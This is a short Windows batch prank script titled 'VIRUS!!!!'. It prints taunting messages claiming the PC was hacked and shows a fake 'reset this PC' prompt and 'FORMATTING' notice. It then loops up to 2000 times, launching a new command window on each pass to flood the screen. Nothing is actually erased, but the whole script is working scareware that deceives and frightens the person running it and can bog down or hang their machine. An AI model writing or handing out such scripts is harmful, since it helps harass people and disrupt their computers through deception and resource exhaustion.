@echo off
color 0a
title VIRUS!!!!
echo ^<PC^> U *Have Not* been hacked and this *is not* a VIRUS
echo ^<PC^> Do u believe me?
echo ^<Person in A2^> Yes
echo ^<PC^> Well I LIED PFO!!
timeout 5 >nul
cls
echo Are you sure you would like to reset this PC? Y/N
echo : Y
echo FORMATTING
echo HERE COMES THE SCARY LOOKING TEXT:
set no=1
:loop
set /p =%random% <nul
start cmd /c "ECHO :)&timeout 2 >nul"
if %no%==2000 goto end
set /a no=%no%+1 >nul
goto Loop
:end